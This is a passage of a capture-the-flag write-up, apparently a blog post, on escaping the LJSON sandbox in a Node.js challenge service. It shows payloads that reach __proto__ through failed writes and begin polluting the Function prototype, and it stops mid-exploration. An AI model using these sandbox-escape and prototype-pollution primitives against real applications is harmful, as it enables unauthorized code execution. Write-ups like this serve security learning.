@@ -1,0 +1,445 @@
+
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
+	<link href='/global.css' rel='stylesheet'>
+	<title>Sequence as a Service 2</title>
+  </head>
+  <body class="bg-[url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABTElEQVRYha1WWw7DMAjLquYYk7b7H7GTtq9UbWpsQ8fXVh4xJIAfz9f7227IZ9tC3do71bfW2lINPuvW3lP+w2cHgIxHUKZzDhu2yGeZjVAwV6d8EEh4BSw7V6fKvwNwDN37jWId/edYS1TCCqhIfwQ2fg/96QrmDNwyIkDKd+hPAOYgKijKLCt0DszCAKIrUfodQGbgVL9FZywzuqjPWSsie2ULH6HjoCT7kOUbiAI4FWGgYRdkZr4z9ZyxTdsQyR0bmGC1f6PDUIWYXLogCuwcrvzCbej0NRoqTvXUY7XbkA0V9l9t0ss2ZM5uu6kkjnrKB1Bm1fUdAYOUjDlmyov+hwCyC+n4ndEyVTGLEyr9nf0B50C2zJE4I9rmA5XH57wdSEorWSvyETIiNgUjSlWlXxAAU0ZZVRYYpWRD/rWOM7xCEhInuDqM2fwAG58SrpqDi2sAAAAASUVORK5CYII=')] flex flex-col place-items-center min-h-dvh">
+	<div class="bg-(--color-background-one) box-border my-20 border-1 border-(--color-primarygreen) flex flex-col px-5 pb-5 overflow-x-auto font-jetbrains text-lg max-w-95/100">
+		<div class="text-custom-dynamic text-(--color-plaintext)">
+			<h1>The Ark Challenge - Sequence as a Service 2</h1>
+<p>We're given the following files.</p>
+<pre class="language-sh"><code class="language-sh">├── Dockerfile
+├── flag.txt
+└── server
+    ├── index.html
+    ├── index.js
+    ├── lib.js
+    ├── package-lock.json
+    ├── package.json
+    ├── sequences
+    │   ├── factorialNumbers.js
+    │   ├── fibonacciNumbers.js
+    │   ├── lucasNumbers.js
+    │   ├── powersOfTwo.js
+    │   └── triangularNumbers.js
+    └── service.js
+
+<span class="token number">3</span> directories, <span class="token number">13</span> files</code></pre>
+<p>Looking at the <code>Dockerfile</code>, we see that the flag is at <code>/flag.txt</code> on the file system.</p>
+<pre class="language-docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> node:17.0.1-slim</span>
+<span class="token instruction"><span class="token keyword">ENV</span> NODE_ENV=production</span>
+
+<span class="token instruction"><span class="token keyword">WORKDIR</span> /app</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> [<span class="token string">"server/package.json"</span>, <span class="token string">"server/package-lock.json"</span>, <span class="token string">"./"</span>]</span>
+
+<span class="token instruction"><span class="token keyword">RUN</span> npm install --production</span>
+
+<span class="token instruction"><span class="token keyword">COPY</span> server .</span>
+<span class="token instruction"><span class="token keyword">COPY</span> flag.txt /</span>
+
+<span class="token instruction"><span class="token keyword">USER</span> 404:404</span>
+
+<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"node"</span>, <span class="token string">"index.js"</span>]</span></code></pre>
+<p>The following screenshot shows the main page of the site.</p>
+<img class="m-auto border-1 border-(--color-grey-border) sm:w-200" src="/images/Screenshot 2026-01-06 185924.png">
+<p>Already from this screenshot, we can gather that the application accepts four inputs:</p>
+<ul>
+<li>Two 'sequences', which are some sort of operation, e.g. &quot;Triangular numbers&quot;.</li>
+<li>Two 'Indexes', which are an input to the operation. E.g. the input requests the nth result of &quot;Triangular numbers&quot;.</li>
+</ul>
+<p>The below excerpt shows an example of a HTTP request that is made when a sequence and index is selected.</p>
+<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/api/getValue?sequence0=%28a%2Cb%2Cc%29%3D%3E%28a%28%22%2F%22%2Ca%28%22*%22%2Cc%2Ca%28%22%2B%22%2Cc%2C1%29%29%2C2%29%29&amp;n0=6&amp;sequence1=%28a%2Cb%2Cc%29%3D%3E%28a%28%22%2C%22%2Ca%28%22%2C%22%2Ca%28%22set%22%2Cb%2C0%2C1%29%2Ca%28%22for%22%2C0%2Cc%2C%28d%29%3D%3E%28a%28%22set%22%2Cb%2C0%2Ca%28%22*%22%2Ca%28%22get%22%2Cb%2C0%29%2C2%29%29%29%29%29%2Ca%28%22get%22%2Cb%2C0%29%29%29&amp;n1=5</span> <span class="token http-version property">HTTP/1.1</span></span>
+<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:3000</span></span></code></pre>
+<p>We can see that all inputs are sent at once, where <code>sequence0</code> and <code>n0</code> are the first set, and <code>sequence1</code> and <code>n1</code> are the second set. The following snippet shows the above sequences URL decoded.</p>
+<pre class="language-js"><code class="language-js"><span class="token function-variable function">Sequence0</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token function-variable function">Sequence1</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"for"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>c<span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token parameter">d</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"get"</span><span class="token punctuation">,</span>b<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>This looks very interesting! To get a better idea of what's going on here, let's open up <code>index.js</code>.</p>
+<pre class="language-js"><code class="language-js"><span class="token operator">...</span>snip<span class="token operator">...</span>
+fastify<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"/api/getValue"</span><span class="token punctuation">,</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> reply</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">const</span> sequence0 <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>sequence0<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> n0 <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>n0<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> sequence1 <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>sequence1<span class="token punctuation">;</span>
+  <span class="token keyword">const</span> n1 <span class="token operator">=</span> request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>n1<span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span>sequence0 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> n0 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> sequence1 <span class="token operator">==</span> <span class="token keyword">null</span> <span class="token operator">||</span> n1 <span class="token operator">==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    reply<span class="token punctuation">.</span><span class="token function">code</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Invalid params"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span>
+
+  <span class="token keyword">try</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> result <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">execFile</span><span class="token punctuation">(</span>
+      <span class="token string">"node"</span><span class="token punctuation">,</span>
+      <span class="token punctuation">[</span><span class="token string">"./service.js"</span><span class="token punctuation">,</span> sequence0<span class="token punctuation">,</span> n0<span class="token punctuation">,</span> sequence1<span class="token punctuation">,</span> n1<span class="token punctuation">]</span><span class="token punctuation">,</span>
+      <span class="token punctuation">{</span>
+        <span class="token literal-property property">timeout</span><span class="token operator">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>
+      <span class="token punctuation">}</span>
+    <span class="token punctuation">)</span><span class="token punctuation">;</span>
+    reply
+      <span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/json; charset=utf-8"</span><span class="token punctuation">)</span>
+      <span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>result<span class="token punctuation">.</span>stdout<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    reply<span class="token punctuation">.</span>statusCode <span class="token operator">=</span> <span class="token number">500</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span>err<span class="token punctuation">.</span>killed<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Timeout"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
+      reply<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"Something wrong"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token operator">...</span>snip<span class="token operator">...</span></code></pre>
+<p>This seems pretty straightforward, the application just takes our inputs and passes them to a <code>service.js</code> subprocess. The following excerpt shows the <code>service.js</code> source code.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">const</span> <span class="token constant">LJSON</span> <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"ljson"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> lib <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"./lib.js"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">const</span> sequence0 <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> n0 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> sequence1 <span class="token operator">=</span> process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">const</span> n1 <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token punctuation">[</span>
+  <span class="token constant">LJSON</span><span class="token punctuation">.</span><span class="token function">parseWithLib</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> sequence0<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> n0<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token constant">LJSON</span><span class="token punctuation">.</span><span class="token function">parseWithLib</span><span class="token punctuation">(</span>lib<span class="token punctuation">,</span> sequence1<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span> n1<span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Okay, so our inputs are put into this <code>LJSON.parseWithLib</code> function. Searching on Github for this package leads us to: <a href="https://github.com/VictorTaelin/LJSON">https://github.com/VictorTaelin/LJSON</a>. Reading the documentation, this is a pretty interesting project. It aims to introduce functions into JSON structures in a way that is controlled (see: <a href="https://github.com/VictorTaelin/LJSON?tab=readme-ov-file#why">https://github.com/VictorTaelin/LJSON?tab=readme-ov-file#why</a>).</p>
+<p>Looking at the <code>parseWithLib</code> function (<a href="https://github.com/VictorTaelin/LJSON/blob/0c06399baddc08ede6457a59505e188ec0828dab/LJSON.js#L385-L387">LJSON.js#L385-L387</a>) we can see that the input is passed into a type of sandbox. In the sandox, we only have inherent access to primitives (e.g. <code>1</code>, <code>&quot;&quot;</code>, or <code>[]</code>). We do also get access to the parameters passed to the function generated by <code>parseWithLib</code>, which are <code>{}</code> and <code>n0</code> (or <code>n1</code>). However, we do not have any operations (e.g. <code>+</code>, <code>-</code>, <code>=</code>) available to us. The only operations we can access are defined by the library that is passed into the <code>parseWithLib</code> function. So lets take a look at <code>lib.js</code>, which is the library that the challenge defines.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">const</span> lib <span class="token operator">=</span> <span class="token punctuation">{</span>
+  <span class="token string-property property">"+"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token operator">=></span> x <span class="token operator">+</span> y<span class="token punctuation">,</span>
+  <span class="token string-property property">"-"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token operator">=></span> x <span class="token operator">-</span> y<span class="token punctuation">,</span>
+  <span class="token string-property property">"*"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token operator">=></span> x <span class="token operator">*</span> y<span class="token punctuation">,</span>
+  <span class="token string-property property">"/"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token operator">=></span> x <span class="token operator">/</span> y<span class="token punctuation">,</span>
+  <span class="token string-property property">","</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> y</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span>
+  <span class="token string-property property">"for"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">l<span class="token punctuation">,</span> r<span class="token punctuation">,</span> f</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> l<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> r<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+      <span class="token function">f</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token string-property property">"set"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">map<span class="token punctuation">,</span> i<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    map<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+    <span class="token keyword">return</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+  <span class="token string-property property">"get"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">map<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">typeof</span> i <span class="token operator">===</span> <span class="token string">"number"</span> <span class="token operator">?</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+  <span class="token punctuation">}</span><span class="token punctuation">,</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+module<span class="token punctuation">.</span>exports <span class="token operator">=</span> lib<span class="token punctuation">;</span></code></pre>
+<p>Right...well at this point we know that the flag is never read by the application, so we do have to get code execution using these operations. With JavaScript sandboxes we can target a few goals for escape:</p>
+<ol>
+<li>Get access to and invoke the Function constructor.</li>
+<li>Get prototype pollution. To gain code execution from this we'll also need to find a useful gadget.</li>
+<li>Exploit special functionality of the sandbox itself.</li>
+</ol>
+<p>Getting started on a challenge like this, I usually try to get an understanding of how the sandbox is working - and then start building useful primitives. Since this process is quite experimental, my through process is hard to nicely document. Instead, the following sections show some of the primitives and ideas that I built during experimentation, in rough order from simple/useless to complex/useful.</p>
+<h2>Calling Inherited Functions of the Library Object</h2>
+<p>In the following excerpt, we can use the <code>+</code> operation from <code>lib.js</code> using the <code>a</code> parameter, which exposes the libraries functions.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"+"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>Below we can see how this is implemented in LJSON.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">function</span> <span class="token function">withLib</span><span class="token punctuation">(</span><span class="token parameter">lib<span class="token punctuation">,</span>fn</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">var</span> <span class="token function-variable function">call</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">primName</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//#1</span>
+            <span class="token keyword">var</span> args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>arguments<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            <span class="token keyword">return</span> lib<span class="token punctuation">[</span>primName<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span>args<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//#2</span>
+        <span class="token punctuation">}</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token function">fn</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>call<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>
+<p>Note that the line marked as <code>#1</code> defines <code>a</code>, it is a <code>call</code> function that abstracts a function call. <code>#2</code> shows how the library function is selected. For reference, the following excerpt shows the <code>.apply</code> call that runs during our previous example.</p>
+<pre class="language-js"><code class="language-js"><span class="token keyword">return</span> lib<span class="token punctuation">[</span><span class="token string">"+"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">apply</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>Notice that the index into <code>lib</code> actually gives us more functionality than just the defined functions. This is because we can index inherited properties of the <code>lib</code> object.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"toString"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// RETURNS: '[object Null]'</span></code></pre>
+<p>Since we can only index one attribute deep, this primitive is not super useful on its own, but we can keep a note of it.</p>
+<h2>Getting Attributes</h2>
+<p>Recall that in our library functions we have no way &quot;getting&quot; an attribute unless it can be referenced using a number.</p>
+<pre class="language-js"><code class="language-js"><span class="token string-property property">"get"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">map<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  <span class="token keyword">return</span> <span class="token keyword">typeof</span> i <span class="token operator">===</span> <span class="token string">"number"</span> <span class="token operator">?</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>Trying to get around this limitation, I found that we could instead use failed writes to read an attribute. To elaborate, recall the below implementation of <code>set</code>.</p>
+<pre class="language-js"><code class="language-js"><span class="token string-property property">"set"</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">map<span class="token punctuation">,</span> i<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+  map<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">;</span>
+  <span class="token keyword">return</span> map<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span></code></pre>
+<p>Now, obviously we could try passing <code>__proto__</code> in as the <code>i</code> parameter, but because of the sandbox we could only ever pass simple primitives into <code>value</code>, making that assignment relatively useless. In fact, the write would fail if we tried setting <code>__proto__</code> to something like a number. Interestingly, this will 'silently' fail instead of raising an exception, which means <code>return map[i];</code> will still run! This means we can get a reference to <code>map[&quot;__proto__&quot;]</code> using the following code.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// RETURNS {} (which is the 'console.log' representation of the Function prototype)</span></code></pre>
+<p>This is definitely useful! However, it has its limitations. There's not a lot of attributes that will fail a write like this. For example, the <code>constructor</code> can be happily overwritten.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token string">"constructor"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// RETURNS 1, meaning we overwrote it.</span></code></pre>
+<p>This means we can't simply make our way straight to the Function constructor. However, we can get a little bit closer by using JavaScript primitives as the subject of our write. The following documentation of JavaScript primitives gives the information needed to understand why this will be the case:</p>
+<ul>
+<li><a href="https://developer.mozilla.org/en-US/docs/Glossary/Primitive">https://developer.mozilla.org/en-US/docs/Glossary/Primitive</a></li>
+</ul>
+<p>The key takeaways are that:</p>
+<ul>
+<li>Primitives are immutable and cannot be changed.</li>
+<li>Primitives are not objects, and have no methods or properties.</li>
+<li>To make properties and methods available, primitives are wrapped by a temporary object (this is called auto-boxing).
+<ul>
+<li>For example, <code>&quot;foo&quot;.includes(&quot;f&quot;)</code> implicitly creates a <code>String</code> wrapper object and calls <code>String.prototype.includes()</code> on that object.</li>
+</ul>
+</li>
+</ul>
+<p>This means that when we try to <code>set</code> a property of a primitive, it should fail to write and return a reference to the property of its wrapper object. Note that before we were writing to attributes of <code>a</code>, but <code>a</code> is a Function, which isn't a JavaScript primitive so it didn't behave this way. Anyway, the following code demonstrates getting the <code>String()</code> constructor from a String primitive.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token string">"primitive-string"</span><span class="token punctuation">,</span><span class="token string">"constructor"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">// RETURNS [Function: String]</span></code></pre>
+<p>While this is useful, it doesn't immediately give us any benefit over our previous approach, since we still can't reach the Function constructor from here. Regardless, we'll keep these tricks noted down.</p>
+<h2>Prototype Pollution</h2>
+<p>In the last section we got a reference to <code>__proto__</code>. It's time to start cooking. As an example of what we can do with our <code>__proto__</code> reference, we can pollute the <code>call</code> attribute of the Function prototype using the below.</p>
+<pre class="language-js"><code class="language-js"><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">(</span><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span> <span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span><span class="token string">"__proto__"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"call"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
+<p>Note that we're using the prototype reference as the <code>map</code> input for <code>set</code>, meaning this is essentially doing:</p>
+<pre class="language-js"><code class="language-js"><span class="token function">a</span><span class="token punctuation">(</span><span class="token string">"set"</span><span class="token punctuation">,</span> a<span class="token punctuation">[</span><span class="token string">"__proto__"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"call"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment">// THIS IS NOT REAL VALID CODE, JUST AN EXAMPLE TO SHOW WHAT WE'RE DOING</span></code></pre>
+<p>When we run this, we get the following error, indicating that we did in fact overwrite the <code>call</code> method of the Function prototype.</p>
+<pre class="language-js"><code class="language-js"><span class="token operator">...</span>snip<span class="token operator">...</span>
+<span class="token operator">/</span>app<span class="token operator">/</span>node_modules<span class="token operator">/</span>ljson<span class="token operator">/</span><span class="token constant">LJSON</span><span class="token punctuation">.</span>js<span class="token operator">:</span><span class="token number">361</span>
